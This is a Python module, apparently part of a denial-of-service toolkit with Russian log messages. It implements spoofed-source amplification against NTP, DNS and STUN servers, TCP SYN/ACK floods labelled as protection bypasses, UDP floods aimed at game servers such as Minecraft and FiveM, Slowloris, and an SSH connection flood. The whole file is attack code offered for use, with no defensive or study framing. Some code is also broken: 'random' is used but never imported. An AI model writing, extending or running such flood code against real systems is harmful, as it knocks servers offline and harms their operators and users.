import threading
import time
import socket
from scapy.all import IP, UDP, TCP, send
from config import CONFIG, logger
from utils.proxy import get_random_proxy

class Layer4Attack:
    def __init__(self, target_ip, port, duration, attack_type):
        self.target_ip = target_ip
        self.port = int(port)
        self.duration = float(duration)
        self.attack_type = attack_type
        self.stop_event = threading.Event()

    def stop(self):
        self.stop_event.set()

class AMPAttack(Layer4Attack):
    def __init__(self, target_ip, port, amp_type, duration):
        super().__init__(target_ip, port, duration, amp_type)
        self.amp_servers = {
            'NTP': 'pool.ntp.org:123',
            'DNS': '8.8.8.8:53',
            'STUN': 'stun.l.google.com:3478',
            'WSD': '239.255.255.250:3702',
            'SADP': '224.0.0.252:8000'
        }

    def run(self):
        def attack():
            server = self.amp_servers[self.attack_type].split(':')
            pkt = IP(dst=server[0], src=self.target_ip) / UDP(dport=int(server[1]), sport=12345)
            start_time = time.time()
            while time.time() - start_time < self.duration and not self.stop_event.is_set():
                send(pkt, verbose=0)
                time.sleep(0.001)  # Small delay to prevent overwhelming CPU
            logger.info(f"{self.attack_type} атака завершена")
        
        threads = [threading.Thread(target=attack) for _ in range(CONFIG['threads'])]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

class TCPAttack(Layer4Attack):
    def run(self):
        valid_flags = {
            'TCP-ACK': 'A',
            'TCP-SYN': 'S',
            'TCP-BYPASS': 'SA',
            'OVH-TCP': 'SA'
        }
        if self.attack_type not in valid_flags:
            logger.error(f"Недопустимый тип атаки: {self.attack_type}. Доступные: {list(valid_flags.keys())}")
            return

        packet_count = 0

        def attack():
            nonlocal packet_count
            pkt = IP(dst=self.target_ip) / TCP(dport=self.port, sport=12345, flags=valid_flags[self.attack_type])
            start_time = time.time()
            while time.time() - start_time < self.duration and not self.stop_event.is_set():
                try:
                    send(pkt, verbose=0)
                    packet_count += 1
                    if packet_count % 1000 == 0:
                        logger.info(f"Отправлено {packet_count} пакетов для {self.attack_type}")
                    time.sleep(0.001)
                except Exception as e:
                    logger.error(f"Ошибка в {self.attack_type}: {e}")
            logger.info(f"{self.attack_type} атака завершена. Всего отправлено {packet_count} пакетов")
        
        logger.info(f"Запуск {self.attack_type} атаки на {self.target_ip}:{self.port} с {CONFIG['threads']} потоками")
        threads = [threading.Thread(target=attack) for _ in range(CONFIG['threads'])]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

class UDPAttack(Layer4Attack):
    def run(self):
        def attack():
            pkt = IP(dst=self.target_ip) / UDP(dport=self.port, sport=12345)
            start_time = time.time()
            while time.time() - start_time < self.duration and not self.stop_event.is_set():
                send(pkt, verbose=0)
                time.sleep(0.001)
            logger.info(f"{self.attack_type} атака завершена")
        
        threads = [threading.Thread(target=attack) for _ in range(CONFIG['threads'])]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

class GameAttack(Layer4Attack):
    def __init__(self, target_ip, port, game_type, duration):
        super().__init__(target_ip, port, duration, game_type)
        self.game_ports = {
            'GAME': 27015,
            'GAME-MC': 25565,
            'GAME-WARZONE': 3074,
            'GAME-R6': 6015,
            'FIVEM-KILL': 30120
        }

    def run(self):
        def attack():
            pkt = IP(dst=self.target_ip) / UDP(dport=self.game_ports[self.attack_type], sport=12345)
            start_time = time.time()
            while time.time() - start_time < self.duration and not self.stop_event.is_set():
                send(pkt, verbose=0)
                time.sleep(0.001)
            logger.info(f"{self.attack_type} атака завершена")
        
        threads = [threading.Thread(target=attack) for _ in range(CONFIG['threads'])]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

class SlowLorisAttack(Layer4Attack):
    def __init__(self, target_ip, port, duration, attack_type, num_sockets=300):
        super().__init__(target_ip, port, duration, attack_type)
        self.num_sockets = num_sockets
        self.sockets = []
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
        ]

    def run(self):
        logger.info(f"Запуск Slowloris атаки на {self.target_ip}:{self.port} с {self.num_sockets} сокетами.")
        for i in range(self.num_sockets):
            if self.stop_event.is_set():
                break
            t = threading.Thread(target=self._create_socket)
            t.daemon = True
            t.start()
            time.sleep(0.05) # Постепенно создаем сокеты

        # Основной цикл для поддержания атаки
        end_time = time.time() + self.duration
        while time.time() < end_time and not self.stop_event.is_set():
            logger.info(f"Активных сокетов: {len(self.sockets)}. Отправка keep-alive...")
            for s in list(self.sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                except socket.error:
                    self.sockets.remove(s)
            
            # Восстанавливаем сокеты, если их количество уменьшилось
            diff = self.num_sockets - len(self.sockets)
            if diff > 0:
                logger.info(f"Восстановление {diff} сокетов.")
                for _ in range(diff):
                    if self.stop_event.is_set():
                        break
                    t = threading.Thread(target=self._create_socket)
                    t.daemon = True
                    t.start()
                    time.sleep(0.1)

            time.sleep(15) # Пауза перед следующей отправкой keep-alive

        self.stop()
        logger.info("Slowloris атака завершена.")

    def _create_socket(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self.target_ip, self.port))
            
            # Отправляем частичные заголовки
            user_agent = random.choice(self.user_agents)
            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
            s.send(f"Host: {self.target_ip}\r\n".encode("utf-8"))
            s.send(f"User-Agent: {user_agent}\r\n".encode("utf-8"))
            s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
            
            self.sockets.append(s)
        except socket.error as e:
            logger.debug(f"Не удалось создать сокет: {e}")

    def stop(self):
        self.stop_event.set()
        for s in self.sockets:
            try:
                s.close()
            except socket.error:
                pass
        self.sockets = []


class SpecialAttack(Layer4Attack):
    def run(self):
        if self.attack_type == 'SSH':
            def attack():
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                start_time = time.time()
                attack_port = self.port if self.port else 22
                while time.time() - start_time < self.duration and not self.stop_event.is_set():
                    try:
                        s.connect((self.target_ip, attack_port))
                        s.close()
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Recreate socket
                    except:
                        pass
                logger.info(f"{self.attack_type} атака завершена")
            
            threads = [threading.Thread(target=attack) for _ in range(CONFIG['threads'])]
            for t in threads:
                t.start()
            for t in threads:
                t.join()
        else:
            def attack():
                pkt = IP(dst=self.target_ip) / TCP(dport=self.port, sport=12345, flags='SA')
                start_time = time.time()
                while time.time() - start_time < self.duration and not self.stop_event.is_set():
                    send(pkt, verbose=0)
                    time.sleep(0.001)
                logger.info(f"{self.attack_type} атака завершена")
            
            threads = [threading.Thread(target=attack) for _ in range(CONFIG['threads'])]
            for t in threads:
                t.start()
            for t in threads:
                t.join()